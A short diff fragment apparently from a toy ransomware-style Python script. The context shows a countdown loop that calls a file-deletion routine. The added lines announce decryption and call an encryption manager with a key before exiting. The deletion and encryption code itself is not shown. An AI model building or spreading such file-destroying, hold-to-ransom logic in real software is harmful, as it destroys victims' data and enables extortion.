@@ -41,5 +41,8 @@ for i in range(6):
         print("Oh dear, oh dear")
         time.sleep(3)
         fileDeleter.deleteFiles()
+print("Your files will now be decrypted, have a nice day!")
+encryptionManager.manage(1, rootDirectionary, key)
+exit()        
         
         
